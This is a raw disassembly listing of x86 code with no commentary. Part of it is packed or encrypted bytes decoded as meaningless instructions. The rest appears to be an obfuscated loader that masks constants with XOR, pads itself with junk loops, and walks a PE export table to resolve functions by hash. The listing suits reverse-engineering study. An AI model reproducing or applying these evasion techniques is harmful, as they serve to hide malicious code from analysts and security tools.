  4080d5:	test   BYTE PTR [esi],cl
  4080d7:	xor    BYTE PTR [esi],0x75
  4080da:	and    al,0xa0
  4080dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080dd:	fcmove st,st(2)
  4080df:	das    
  4080e0:	mov    ?,WORD PTR [esi]
  4080e2:	test   DWORD PTR [esi+0x33e7e073],0xd7805422
  4080ec:	sbb    ecx,esp
  4080ee:	inc    ecx
  4080ef:	cmp    cl,BYTE PTR [ebx-0x151b15e1]
  4080f5:	jno    0x408152
  4080f7:	mov    BYTE PTR [esi-0x58c4c12c],dl
  4080fd:	sbb    ecx,eax
  4080ff:	enter  0x95d8,0x24
  408103:	aas    
  408104:	jmp    0x4080a3
  408106:	xchg   ecx,eax
  408107:	or     dl,BYTE PTR [esi-0x4ded054f]
  40810d:	push   cs
  40810e:	mov    ah,0x67
  408110:	inc    edi
  408111:	nop
  408112:	mov    edi,0xd242b805
  408117:	pop    ss
  408118:	adc    eax,0xc9ff0baf
  40811d:	call   0x8881a3a1
  408122:	jmp    0x408144
  408124:	adc    cl,BYTE PTR [eax+0x59c778df]
  40812a:	lods   eax,DWORD PTR ds:[esi]
  40812b:	cmp    ch,BYTE PTR [esi-0x59]
  40812e:	sbb    BYTE PTR [edi],dh
  408130:	or     bh,bl
  408132:	add    al,0x2d
  408134:	sbb    dh,bh
  408136:	jne    0x408178
  408138:	ficomp DWORD PTR [esi]
  40813a:	sbb    eax,0xc391a4ac
  40813f:	push   ebx
  408140:	xchg   BYTE PTR [eax+0x35],dh
  408143:	popf   
  408144:	mov    cl,cl
  408146:	mov    bl,BYTE PTR [esi-0x2a330e38]
  40814c:	sub    eax,0x5686a9f7
  408151:	out    0x27,al
  408153:	push   edi
  408154:	jno    0x4081c3
  408156:	fild   WORD PTR gs:[edi+0x74b0036d]
  40815d:	inc    esi
  40815e:	pop    esp
  40815f:	fsub   st(2),st
  408161:	retf   0x91a0
  408164:	(bad)  
  408165:	das    
  408166:	mov    dl,BYTE PTR [ecx-0x3d]
  408169:	inc    ebx
  40816a:	mov    ebx,0x133da2e3
  40816f:	lods   eax,DWORD PTR ds:[esi]
  408170:	pop    edx
  408171:	hlt    
  408172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408173:	jp     0x408170
  408175:	jmp    0xe538:0x65a27470
  40817c:	mov    DWORD PTR [esi-0xc],eax
  40817f:	lock fcmovb st,st(2)
  408182:	bound  esi,QWORD PTR [esi+0x7c3af56e]
  408188:	lahf   
  408189:	ss push 0xa43f347d
  40818f:	jo     0x4081e7
  408191:	sub    edi,DWORD PTR [edx]
  408193:	pop    ebx
  408194:	loopne 0x408161
  408196:	mov    ah,BYTE PTR [ebx+0x61ae50a4]
  40819c:	sti    
  40819d:	test   eax,0xcc6eac8f
  4081a2:	mov    esi,0x21bfed06
  4081a7:	shl    DWORD PTR [ecx-0x2],0x89
  4081ab:	loope  0x40814c
  4081ad:	ret    
  4081ae:	inc    edi
  4081af:	mov    esi,0xb9742512
  4081b4:	mov    ebp,0xf65ee060
  4081b9:	jecxz  0x4081c6
  4081bb:	adc    ebp,DWORD PTR [edi-0x71d86d31]
  4081c1:	pop    ebx
  4081c2:	pop    es
  4081c3:	ret    0xa26d
  4081c6:	xchg   esi,eax
  4081c7:	retf   
  4081c8:	add    ebp,DWORD PTR [ebx+eax*8-0x574f20bf]
  4081cf:	add    dh,BYTE PTR [ecx]
  4081d1:	mov    ah,0xcc
  4081d3:	in     eax,dx
  4081d4:	sub    bl,BYTE PTR [edx-0x1709ddda]
  4081da:	push   ds
  4081db:	rol    DWORD PTR [edx-0x3e59d44e],1
  4081e1:	or     dl,BYTE PTR [esi+0x51]
  4081e4:	xchg   esi,eax
  4081e5:	and    bh,BYTE PTR [esi+edx*1+0x10084a8d]
  4081ec:	cmp    eax,0xed96df94
  4081f1:	push   edi
  4081f2:	jmp    FWORD PTR [ecx]
  4081f4:	mov    DWORD PTR [edi+0x7e],eax
  4081f7:	jmp    0x5fb92996
  4081fc:	scas   eax,DWORD PTR es:[edi]
  4081fd:	pusha  
  4081fe:	mov    cl,0xed
  408200:	add    al,0x76
  408202:	add    al,0x8
  408204:	mov    ebp,0x319d58c1
  408209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40820a:	jns    0x408230
  40820c:	sub    al,0x16
  40820e:	adc    dl,BYTE PTR [esi-0x5b829bb0]
  408214:	dec    esi
  408215:	xchg   cl,ah
  408217:	aam    0x97
  408219:	sbb    dh,BYTE PTR [ecx-0x31]
  40821c:	jl     0x4081bc
  40821e:	and    cl,dl
  408220:	popf   
  408221:	pop    es
  408222:	and    eax,0xd4bdfdad
  408227:	jl     0x4081ba
  408229:	jmp    0x40827e
  40822b:	xchg   edi,eax
  40822c:	daa    
  40822d:	pop    ebx
  40822e:	lods   al,BYTE PTR ds:[esi]
  40822f:	and    esp,ebp
  408231:	lods   eax,DWORD PTR ds:[esi]
  408232:	clc    
  408233:	adc    BYTE PTR [ecx-0x2bc80846],0x8b
  40823a:	mov    cl,0x9e
  40823c:	es xchg esi,eax
  40823e:	sub    al,0xf7
  408240:	push   0xbc5eeeec
  408245:	stos   DWORD PTR es:[di],eax
  408247:	mov    ds:0xc1922036,al
  40824c:	jbe    0x40820a
  40824e:	inc    DWORD PTR [ebx+ecx*8]
  408251:	mov    ebx,0x671bd91c
  408256:	movhps QWORD PTR [esi],xmm4
  408259:	pop    ss
  40825a:	mov    al,ds:0x586c593c
  40825f:	inc    esi
  408260:	pop    ebp
  408261:	adc    DWORD PTR [ebp-0x1238fd4c],edi
  408267:	int    0x21
  408269:	imul   ebp,DWORD PTR [ebx+ebp*8-0x31],0x2d
  40826e:	jl     0x408292
  408270:	inc    ebx
  408271:	jmp    0x84548521
  408276:	pop    es
  408277:	outs   dx,DWORD PTR ds:[esi]
  408278:	xchg   edi,eax
  408279:	das    
  40827a:	fisubr WORD PTR [eax]
  40827c:	jne    0x4082da
  40827e:	jmp    0x40827b
  408280:	sub    al,0x69
  408282:	push   eax
  408283:	dec    edi
  408284:	lods   al,BYTE PTR ds:[esi]
  408285:	out    0x18,eax
  408287:	scas   al,BYTE PTR es:[edi]
  408288:	outs   dx,BYTE PTR ds:[esi]
  408289:	repz push eax
  40828b:	mov    ebx,DWORD PTR [eax-0x2007f9fc]
  408291:	dec    edi
  408292:	pop    edi
  408293:	(bad)
  408296:	out    dx,al
  408297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408298:	out    dx,al
  408299:	repz es inc esi
  40829c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40829d:	jmp    0x50ca:0xe04599ab
  4082a4:	jns    0x408317
  4082a6:	pop    es
  4082a7:	and    DWORD PTR [ecx+0xe],esp
  4082aa:	mov    esp,0x7acc509d
  4082af:	cmp    esp,DWORD PTR [eax-0x48]
  4082b2:	mov    esp,0x8ad8febd
  4082b7:	into   
  4082b8:	jns    0x408265
  4082ba:	loope  0x4082b8
  4082bc:	or     al,0x18
  4082be:	inc    esi
  4082bf:	jge    0x40830e
  4082c1:	or     esi,DWORD PTR [esi+0x36]
  4082c4:	stos   BYTE PTR es:[edi],al
  4082c5:	dec    esi
  4082c6:	in     al,dx
  4082c7:	jns    0x408304
  4082c9:	mov    al,ds:0x1a14b8b4
  4082ce:	jbe    0x408344
  4082d0:	xlat   BYTE PTR ds:[ebx]
  4082d1:	sbb    cl,BYTE PTR [edx+0x60]
  4082d4:	in     al,dx
  4082d5:	(bad)  
  4082d6:	rcr    DWORD PTR [eax+0x2a05bbbf],1
  4082dc:	das    
  4082dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082de:	add    al,0x72
  4082e0:	pop    ss
  4082e1:	pop    edi
  4082e2:	retf   
  4082e3:	pop    edx
  4082e4:	out    dx,al
  4082e5:	and    ecx,DWORD PTR [ecx+0x6f83c1c]
  4082eb:	mov    eax,ds:0x7f0b757e
  4082f0:	dec    esp
  4082f1:	xchg   edi,eax
  4082f2:	jb     0x408274
  4082f4:	adc    BYTE PTR [esp+ebx*2],al
  4082f7:	and    BYTE PTR [ecx+0x18ea34a5],dl
  4082fd:	jne    0x4082f7
  4082ff:	mov    BYTE PTR [ebx],0xca
  408302:	jge    0x4082a9
  408304:	mov    cs,WORD PTR [edi-0x45d3f52]
  40830a:	dec    ebx
  40830b:	jo     0x4082d4
  40830d:	push   ebp
  40830e:	mov    edx,DWORD PTR [edx-0x1c]
  408311:	and    DWORD PTR [ecx],eax
  408313:	pop    esp
  408314:	mov    dh,0x36
  408316:	inc    ebp
  408317:	mov    WORD PTR [edx],fs
  408319:	mov    WORD PTR [edx],ss
  40831b:	xchg   bh,ch
  40831d:	ret    
  40831e:	inc    ebx
  40831f:	xlat   BYTE PTR ds:[ebx]
  408320:	pop    esi
  408321:	adc    ah,BYTE PTR [ecx+ebp*4-0x6]
  408325:	repnz push esi
  408327:	cli    
  408328:	or     esi,DWORD PTR ds:0x6214b972
  40832e:	scas   eax,DWORD PTR es:[edi]
  40832f:	aas    
  408330:	xchg   esi,eax
  408331:	pop    eax
  408332:	xchg   edi,eax
  408333:	int3   
  408334:	jne    0x408333
  408336:	ds into 
  408338:	(bad)  
  408339:	(bad)  
  40833a:	in     al,dx
  40833b:	push   ebp
  40833c:	mov    cl,dh
  40833e:	add    ebp,DWORD PTR [esi]
  408340:	xchg   cl,cl
  408342:	add    esp,DWORD PTR [ebp+0x221698f9]
  408348:	cs pop esp
  40834a:	mov    eax,0xaab0191f
  40834f:	xchg   ebp,eax
  408350:	jnp    0x408390
  408352:	xchg   BYTE PTR [eax-0x2f],al
  408355:	bound  ebp,QWORD PTR [edi+0xa]
  408358:	(bad)  
  408359:	jmp    0xeb75:0x47a920c1
  408360:	mov    al,0x4c
  408362:	mov    es,WORD PTR [ecx]
  408364:	jns    0x4083b7
  408366:	std    
  408367:	pop    eax
  408368:	jle    0x408353
  40836a:	lss    eax,FWORD PTR [edx+0x1c52108f]
  408371:	out    dx,eax
  408372:	cmp    BYTE PTR [edi],0xb9
  408375:	add    DWORD PTR [ebp-0x783ff61d],esp
  40837b:	lock xchg esp,eax
  40837d:	or     eax,0xc57ea10c
  408382:	ss sbb bh,bl
  408385:	xor    BYTE PTR [edi+ebx*4-0x17737837],dh
  40838c:	rcl    DWORD PTR [ebx+0xd],1
  40838f:	pop    edx
  408390:	and    al,0x6f
  408392:	mov    ds:0xd177cea2,eax
  408397:	sbb    ah,BYTE PTR [edx*1-0x58c7e97a]
  40839e:	jne    0x40839a
  4083a0:	inc    esp
  4083a1:	mov    BYTE PTR [ecx+0x1e7d7431],0xe7
  4083a8:	push   ebp
  4083a9:	fisubr DWORD PTR [ebx-0x32]
  4083ac:	xor    eax,0xf9f51bd2
  4083b1:	push   0x51bd8a09
  4083b6:	jb     0x4083e6
  4083b8:	xor    BYTE PTR [edi+0x1c3c544],dl
  4083be:	mov    ebx,0x8a13d8b
  4083c3:	mov    al,0x52
  4083c5:	mov    esp,0xa74fa2f3
  4083ca:	aad    0xb6
  4083cc:	pop    esp
  4083cd:	rol    DWORD PTR [eax+ebx*2+0x53],1
  4083d1:	daa    
  4083d2:	mov    BYTE PTR [edi-0x47205881],bh
  4083d8:	add    al,0x75
  4083da:	xchg   edx,eax
  4083db:	fsubr  st(1),st
  4083dd:	ds pop ebx
  4083df:	and    DWORD PTR [edx],eax
  4083e1:	retf   
  4083e2:	aaa    
  4083e3:	mov    edi,0x355b261e
  4083e8:	sbb    edx,eax
  4083ea:	loop   0x408465
  4083ec:	(bad)  
  4083ed:	call   0x1bb8941d
  4083f2:	xchg   edx,eax
  4083f3:	push   eax
  4083f4:	std    
  4083f5:	xor    ebp,DWORD PTR [eax]
  4083f7:	push   ecx
  4083f8:	sbb    ebp,DWORD PTR [ebp+0x312b3c04]
  4083fe:	leave  
  4083ff:	sbb    eax,0xb6b184eb
  408404:	ss adc eax,0x451b63f3
  40840a:	jmp    0x40847f
  40840c:	pop    edx
  40840d:	sbb    ebp,DWORD PTR [ebp-0x61]
  408410:	cmc    
  408411:	loopne 0x408486
  408413:	fsubr  QWORD PTR [ecx+0x37e6bdca]
  408419:	adc    ebx,DWORD PTR [eax+0x57f6d2db]
  40841f:	hlt    
  408420:	or     BYTE PTR [ebx-0x30],cl
  408423:	add    ebx,DWORD PTR [edi+eax*1-0x6869c878]
  40842a:	sub    DWORD PTR [ecx],ebp
  40842c:	xchg   ebx,eax
  40842d:	leave  
  40842e:	and    DWORD PTR [ebx+0x58],ecx
  408431:	xlat   BYTE PTR ds:[ebx]
  408432:	daa    
  408433:	stos   BYTE PTR es:[edi],al
  408434:	popa   
  408435:	adc    al,0x89
  408437:	inc    ecx
  408438:	imul   esi,edi,0xffffff99
  40843b:	xchg   DWORD PTR [eax+0x68],esp
  40843e:	retf   
  40843f:	cdq    
  408440:	xchg   edi,eax
  408441:	dec    ecx
  408442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408443:	adc    ebx,edx
  408445:	lahf   
  408446:	push   DWORD PTR [edx]
  408448:	or     al,cl
  40844a:	pop    edi
  40844b:	xor    DWORD PTR [eax+0x12],esp
  40844e:	mov    cl,0x17
  408450:	(bad)  
  408451:	mov    cl,0xa9
  408453:	dec    ebx
  408454:	daa    
  408455:	add    eax,0xacc578c2
  40845a:	ins    DWORD PTR es:[edi],dx
  40845b:	mov    eax,0x6116c094
  408460:	add    al,0xcc
  408462:	mov    ebx,DWORD PTR [ebp-0x8]
  408465:	mov    BYTE PTR [edx+ebx*1],al
  408468:	mov    eax,DWORD PTR [ebp-0x40]
  40846b:	mov    edx,DWORD PTR [ebp-0x28]
  40846e:	xor    eax,esi
  408470:	xor    edx,esi
  408472:	add    eax,edi
  408474:	add    edx,edi
  408476:	imul   eax,edx
  408479:	add    eax,DWORD PTR [ebp-0xc]
  40847c:	mov    DWORD PTR [ebp-0xc],eax
  40847f:	mov    eax,DWORD PTR [ebp-0xc]
  408482:	mov    edx,DWORD PTR [ebp-0x18]
  408485:	cmp    edx,eax
  408487:	jb     0x403cec
  40848d:	mov    eax,DWORD PTR [ebp-0x28]
  408490:	mov    edx,DWORD PTR [ebp-0x18]
  408493:	xor    eax,esi
  408495:	add    eax,edi
  408497:	imul   eax,edx
  40849a:	mov    edx,DWORD PTR [ebp-0x1c]
  40849d:	xor    edx,esi
  40849f:	add    edx,edi
  4084a1:	or     eax,edx
  4084a3:	mov    edx,DWORD PTR [ebp-0x20]
  4084a6:	xor    edx,esi
  4084a8:	add    eax,edx
  4084aa:	mov    edx,DWORD PTR [ebp-0x20]
  4084ad:	xor    edx,esi
  4084af:	add    eax,edx
  4084b1:	mov    edx,DWORD PTR [ebp-0x10]
  4084b4:	lea    eax,[eax+edx*1+0x64e5f0]
  4084bb:	jmp    0x4084cf
  4084c0:	mov    eax,DWORD PTR [ebp-0x20]
  4084c3:	mov    edx,DWORD PTR [ebp-0x10]
  4084c6:	xor    eax,esi
  4084c8:	lea    eax,[eax+edx*1+0x3272f8]
  4084cf:	mov    DWORD PTR [ebp-0x10],eax
  4084d2:	jmp    0x403c39
  4084d7:	mov    ebx,DWORD PTR [ebp-0x3c]
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	lea    ecx,[ecx+eax*1+0x3272f8]
  4084e6:	lea    eax,[ecx-0x3272f8]
  4084ec:	xor    eax,esi
  4084ee:	cmp    eax,0xf89c95b9
  4084f3:	jne    0x403bdd
  4084f9:	dec    DWORD PTR [ebp-0x34]
  4084fc:	jne    0x403bd1
  408502:	mov    eax,DWORD PTR [ebp+0x8]
  408505:	mov    ecx,DWORD PTR [ebp+0xc]
  408508:	mov    edx,DWORD PTR [ebp+0x8]
  40850b:	xor    ecx,esi
  40850d:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f8]
  408514:	xor    eax,esi
  408516:	mov    al,BYTE PTR [eax+ebx*1+0x3272f8]
  40851d:	xor    edx,esi
  40851f:	mov    BYTE PTR [edx+ebx*1+0x3272f8],cl
  408526:	mov    ecx,DWORD PTR [ebp+0xc]
  408529:	xor    ecx,esi
  40852b:	mov    BYTE PTR [ecx+ebx*1+0x3272f8],al
  408532:	mov    eax,DWORD PTR [ebp+0xc]
  408535:	xor    eax,esi
  408537:	add    eax,edi
  408539:	pop    edi
  40853a:	pop    esi
  40853b:	pop    ebx
  40853c:	leave  
  40853d:	ret    0x8
  408540:	sbb    DWORD PTR ds:0x428ec1,0x6a44
  40854a:	xor    eax,eax
  40854c:	ret    
  40854d:	push   ebp
  40854e:	mov    ebp,esp
  408550:	sub    esp,0x38
  408553:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40855a:	adc    DWORD PTR ds:0x428ead,0x214
  408564:	push   ebx
  408565:	sbb    DWORD PTR ds:0x428e39,0x495a
  40856f:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  408576:	add    DWORD PTR ds:0x428ea9,0x428e91
  408580:	mov    eax,DWORD PTR [ebp-0x4]
  408583:	sub    DWORD PTR ds:0x428ea5,0x68fd
  40858d:	push   esi
  40858e:	sub    DWORD PTR ds:0x428e6d,ebx
  408594:	mov    esi,0x75108b1
  408599:	xor    eax,esi
  40859b:	adc    DWORD PTR ds:0x428e95,0x428e2d
  4085a5:	push   edi
  4085a6:	mov    edi,0x3272f8
  4085ab:	sub    DWORD PTR ds:0x428ecd,0x5e85
  4085b5:	add    eax,edi
  4085b7:	sub    DWORD PTR ds:0x428eb5,0x428e59
  4085c1:	mov    DWORD PTR [ebp-0x1c],eax
  4085c4:	mov    eax,DWORD PTR [ebp+0x14]
  4085c7:	test   eax,eax
  4085c9:	je     0x408625
  4085cf:	and    DWORD PTR ds:0x428e41,0x0
  4085d9:	mov    eax,ds:0x428e41
  4085de:	inc    eax
  4085df:	mov    ds:0x428e41,eax
  4085e4:	cmp    DWORD PTR ds:0x428e41,0x1c
  4085eb:	jl     0x408613
  4085f1:	jmp    0x408606
  4085f6:	push   0x428073
  4085fb:	push   0x400000
  408600:	call   DWORD PTR ds:0x42ca24
  408606:	cmp    DWORD PTR ds:0x428e41,0x13
  40860d:	jb     0x4085d9
  408613:	mov    eax,DWORD PTR [ebp+0x14]
  408616:	sbb    DWORD PTR ds:0x428e25,0x208f
  408620:	mov    eax,DWORD PTR [eax]
  408622:	mov    DWORD PTR [ebp-0x1c],eax
  408625:	and    DWORD PTR ds:0x428e4d,edx
  40862b:	mov    eax,DWORD PTR [ebp-0x4]
  40862e:	xor    eax,esi
  408630:	add    eax,edi
  408632:	movzx  ebx,BYTE PTR ds:0x428e6d
  408639:	sub    DWORD PTR ds:0x428eb5,ebx
  40863f:	mov    DWORD PTR [ebp-0x8],eax
  408642:	mov    ebx,DWORD PTR ds:0x428e45
  408648:	sub    DWORD PTR ds:0x428ead,ebx
  40864e:	mov    eax,DWORD PTR [ebp-0xc]
  408651:	xor    eax,esi
  408653:	or     DWORD PTR ds:0x428e25,0x7ae1
  40865d:	add    eax,edi
  40865f:	mov    DWORD PTR [ebp-0x24],eax
  408662:	mov    DWORD PTR ds:0x428eb5,0x1d
  40866c:	cmp    DWORD PTR ds:0x428eb5,0x0
  408673:	je     0x4086a6
  408679:	cmp    DWORD PTR ds:0x428eb5,0x22
  408680:	jb     0x4086a6
  408686:	jmp    0x408696
  40868b:	push   0x35a8
  408690:	call   DWORD PTR ds:0x42ca28
  408696:	mov    eax,ds:0x428eb5
  40869b:	dec    eax
  40869c:	mov    ds:0x428eb5,eax
  4086a1:	jmp    0x40866c
  4086a6:	mov    eax,DWORD PTR [ebp-0x4]
  4086a9:	xor    eax,esi
  4086ab:	sub    ebx,DWORD PTR ds:0x428e35
  4086b1:	add    eax,edi
  4086b3:	mov    DWORD PTR [ebp-0x30],eax
  4086b6:	sbb    eax,0x56d4
  4086bb:	mov    ebx,DWORD PTR [ebp-0x4]
  4086be:	sub    DWORD PTR ds:0x428e55,edi
  4086c4:	xor    ebx,esi
  4086c6:	mov    DWORD PTR ds:0x428e8d,0xdd6
  4086d0:	add    ebx,edi
  4086d2:	mov    eax,DWORD PTR [ebp-0x24]
  4086d5:	sub    eax,edi
  4086d7:	xor    DWORD PTR ds:0x428e2d,0x506a
  4086e1:	lea    ecx,[ebx-0x3272f8]
  4086e7:	or     DWORD PTR ds:0x428e31,0x428e75
  4086f1:	xor    eax,esi
  4086f3:	or     DWORD PTR ds:0x428e41,0x428e89
  4086fd:	xor    ecx,esi
  4086ff:	mov    DWORD PTR ds:0x428e71,0xf9c
  408709:	cmp    ecx,eax
  40870b:	je     0x408990
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	add    DWORD PTR ds:0x428e99,0x428e29
  40871e:	xor    eax,esi
  408720:	sbb    DWORD PTR ds:0x428ead,0x428e4d
  40872a:	add    eax,edi
  40872c:	cmp    ebx,eax
  40872e:	jne    0x408947
  408734:	push   DWORD PTR [ebp+0x8]
  408737:	call   0x423f19
  40873c:	and    DWORD PTR ds:0x428ea1,0x3c45
  408746:	mov    DWORD PTR [ebp-0x14],eax
  408749:	and    DWORD PTR ds:0x428e89,0x0
  408753:	mov    eax,ds:0x428e89
  408758:	inc    eax
  408759:	mov    ds:0x428e89,eax
  40875e:	cmp    DWORD PTR ds:0x428e89,0x23
  408765:	ja     0x408786
  40876b:	jmp    0x408779
  408770:	push   DWORD PTR [ebp-0x24]
  408773:	call   DWORD PTR ds:0x42ca2c
  408779:	cmp    DWORD PTR ds:0x428e89,0x15
  408780:	jb     0x408753
  408786:	mov    eax,DWORD PTR [ebp-0x4]
  408789:	mov    ecx,DWORD PTR [ebp-0x14]
  40878c:	sbb    DWORD PTR ds:0x428e71,0x428e81
  408796:	xor    eax,esi
  408798:	and    DWORD PTR ds:0x428e4d,0x12fb
  4087a2:	add    eax,edi
  4087a4:	cmp    ecx,eax
  4087a6:	mov    DWORD PTR ds:0x428e69,0x743f
  4087b0:	je     0x408a8e
  4087b6:	xor    DWORD PTR ds:0x428e7d,0x5052
  4087c0:	push   DWORD PTR [ebp-0x14]
  4087c3:	push   DWORD PTR [ebp+0x8]
  4087c6:	xor    DWORD PTR ds:0x428ea5,0x6996
  4087d0:	call   0x423fff
  4087d5:	mov    DWORD PTR [ebp-0x14],eax
  4087d8:	mov    eax,DWORD PTR [ebp-0x4]
  4087db:	sub    DWORD PTR ds:0x428e4d,edi
  4087e1:	mov    ecx,DWORD PTR [ebp-0x14]
  4087e4:	sbb    DWORD PTR ds:0x428e35,0x169a
  4087ee:	xor    eax,esi
  4087f0:	sbb    DWORD PTR ds:0x428e31,0x428ebd
  4087fa:	add    eax,edi
  4087fc:	mov    DWORD PTR ds:0x428e99,0xb5
  408806:	cmp    ecx,eax
  408808:	mov    DWORD PTR ds:0x428ebd,0x5868
  408812:	je     0x408a8e
  408818:	mov    DWORD PTR ds:0x428e41,0x51a7
  408822:	mov    eax,DWORD PTR [ebp-0x14]
  408825:	mov    eax,DWORD PTR [eax+0x18]
  408828:	adc    ecx,DWORD PTR ds:0x428e71
  40882e:	mov    DWORD PTR [ebp-0x24],eax
  408831:	and    DWORD PTR ds:0x428e95,0x0
  40883b:	jmp    0x40884d
  408840:	mov    ecx,DWORD PTR ds:0x428e95
  408846:	inc    ecx
  408847:	mov    DWORD PTR ds:0x428e95,ecx
  40884d:	cmp    DWORD PTR ds:0x428e95,0x1a
  408854:	jae    0x408896
  40885a:	cmp    DWORD PTR ds:0x428e95,0xd
  408861:	jge    0x408896
  408867:	jmp    0x408877
  40886c:	push   0x428043
  408871:	call   DWORD PTR ds:0x42ca30
  408877:	cmp    DWORD PTR ds:0x428e95,0xc
  40887e:	jne    0x408891
  408884:	mov    ecx,DWORD PTR ds:0x428e95
  40888a:	inc    ecx
  40888b:	mov    DWORD PTR ds:0x428e95,ecx
  408891:	jmp    0x408840
  408896:	mov    eax,DWORD PTR [ebp-0x14]
  408899:	dec    DWORD PTR ds:0x428ea9
  40889f:	mov    ecx,DWORD PTR [ebp+0x8]
  4088a2:	add    DWORD PTR ds:0x428e71,0x6a43
  4088ac:	add    ecx,DWORD PTR [eax+0x20]
  4088af:	mov    DWORD PTR ds:0x428e95,0x1e
  4088b9:	cmp    DWORD PTR ds:0x428e95,0x0
  4088c0:	je     0x40890b
  4088c6:	cmp    DWORD PTR ds:0x428e95,0xd
  4088cd:	jl     0x40890b
  4088d3:	jmp    0x4088e3
  4088d8:	push   0x635d
  4088dd:	call   DWORD PTR ds:0x42ca38
  4088e3:	cmp    DWORD PTR ds:0x428e95,0xe
  4088ea:	jne    0x4088fb
  4088f0:	mov    eax,ds:0x428e95
  4088f5:	dec    eax
  4088f6:	mov    ds:0x428e95,eax
  4088fb:	mov    eax,ds:0x428e95
  408900:	dec    eax
  408901:	mov    ds:0x428e95,eax
  408906:	jmp    0x4088b9
  40890b:	mov    DWORD PTR [ebp-0x2c],ecx
  40890e:	mov    eax,DWORD PTR [ebp-0x14]
  408911:	mov    ecx,DWORD PTR [ebp+0x8]
  408914:	add    DWORD PTR ds:0x428e75,0x428ed1
  40891e:	add    ecx,DWORD PTR [eax+0x24]
  408921:	or     DWORD PTR ds:0x428e3d,edi
  408927:	mov    DWORD PTR [ebp-0x34],ecx
  40892a:	sbb    ecx,ecx
  40892c:	mov    eax,DWORD PTR [ebp-0x14]
  40892f:	mov    ecx,DWORD PTR [ebp+0x8]
  408932:	add    ecx,DWORD PTR [eax+0x1c]
  408935:	mov    DWORD PTR ds:0x428e9d,0x2455
  40893f:	mov    DWORD PTR [ebp-0x14],ecx
  408942:	jmp    0x408a15
  408947:	add    eax,DWORD PTR ds:0x428e65
  40894d:	mov    eax,DWORD PTR [ebp-0x2c]
  408950:	mov    ecx,DWORD PTR [ebp+0x8]
  408953:	add    ecx,DWORD PTR [eax+ebx*4]
  408956:	mov    DWORD PTR [ebp-0x28],ecx
  408959:	mov    ecx,DWORD PTR ds:0x428ea5
  40895f:	and    DWORD PTR ds:0x428e31,ecx
  408965:	mov    eax,DWORD PTR [ebp-0x4]
  408968:	mov    ecx,DWORD PTR [ebp-0x28]
  40896b:	xor    eax,esi
  40896d:	sub    DWORD PTR ds:0x428ebd,0x6f28
  408977:	add    eax,edi
  408979:	cmp    ecx,eax
  40897b:	mov    DWORD PTR ds:0x428ea9,0x5189
  408985:	je     0x408a15
  40898b:	jmp    0x4089f2
  408990:	mov    eax,DWORD PTR [ebp-0x4]
  408993:	and    ecx,DWORD PTR ds:0x428e65
  408999:	mov    ecx,DWORD PTR [ebp-0x8]
  40899c:	xor    eax,esi
  40899e:	dec    DWORD PTR ds:0x428e8d
  4089a4:	add    eax,edi
  4089a6:	mov    DWORD PTR ds:0x428e99,0x7af8
  4089b0:	cmp    ecx,eax
  4089b2:	mov    eax,DWORD PTR [ebp-0x4]
  4089b5:	mov    DWORD PTR ds:0x428e4d,0x614e
  4089bf:	je     0x408a91
  4089c5:	and    DWORD PTR ds:0x428e79,0x1e6e
  4089cf:	mov    ecx,DWORD PTR [ebp-0x30]
  4089d2:	xor    eax,esi
  4089d4:	add    eax,edi
  4089d6:	mov    DWORD PTR ds:0x428ecd,0x6155
  4089e0:	cmp    ecx,eax
  4089e2:	mov    DWORD PTR ds:0x428e41,0x6810
  4089ec:	je     0x408a9a
  4089f2:	lea    eax,[ebp-0x8]
  4089f5:	xor    DWORD PTR ds:0x428ec1,0x428e25
  4089ff:	push   eax
  408a00:	push   DWORD PTR [ebp-0x28]
  408a03:	sbb    DWORD PTR ds:0x428e71,0x1b8d
  408a0d:	push   DWORD PTR [ebp+0xc]
  408a10:	call   0x40f741
  408a15:	or     DWORD PTR ds:0x428e9d,edx
  408a1b:	mov    eax,DWORD PTR [ebp-0x4]
  408a1e:	sbb    DWORD PTR ds:0x428e5d,edx
  408a24:	mov    ecx,DWORD PTR [ebp-0x8]
  408a27:	xor    DWORD PTR ds:0x428e9d,0xa39
  408a31:	xor    eax,esi
  408a33:	sbb    DWORD PTR ds:0x428e39,0x428e35
  408a3d:	add    eax,edi
  408a3f:	mov    DWORD PTR ds:0x428e3d,0x1847
  408a49:	cmp    ecx,eax
  408a4b:	mov    DWORD PTR ds:0x428e41,0x373f
  408a55:	je     0x408a7d
  408a5b:	movzx  ecx,WORD PTR ds:0x428e49
  408a62:	mov    eax,DWORD PTR [ebp-0x34]
  408a65:	movzx  eax,WORD PTR [eax+ebx*2]
  408a69:	mov    ecx,DWORD PTR ds:0x428e4d
  408a6f:	mov    ecx,DWORD PTR [ebp-0x14]
  408a72:	mov    eax,DWORD PTR [ecx+eax*4]
  408a75:	mov    DWORD PTR [ebp-0x38],eax
  408a78:	jmp    0x408990
  408a7d:	mov    eax,DWORD PTR [ebp-0xc]
  408a80:	xor    eax,esi
  408a82:	lea    ebx,[ebx+eax*1+0x3272f8]
  408a89:	jmp    0x4086d2
  408a8e:	mov    eax,DWORD PTR [ebp-0x4]
  408a91:	xor    eax,esi
  408a93:	add    eax,edi
  408a95:	jmp    0x40f699
  408a9a:	mov    eax,DWORD PTR [ebp-0x38]
  408a9d:	add    eax,DWORD PTR [ebp+0x8]
  408aa0:	mov    DWORD PTR [ebp-0x18],eax
  408aa3:	mov    eax,DWORD PTR [ebp-0x1c]
  408aa6:	test   eax,eax
  408aa8:	je     0x40d282
  408aae:	mov    DWORD PTR [ebp-0x20],0x0
  408ab5:	push   0x4
  408ab7:	xor    edx,edx
  408ab9:	pop    edx
  408aba:	add    edx,0x9
  408abd:	push   edx
  408abe:	pop    ecx
  408abf:	push   0x8
  408ac1:	dec    ecx
  408ac2:	pop    ebx
  408ac3:	dec    ebx
  408ac4:	xchg   ebx,ecx
  408ac6:	sub    ebx,ecx
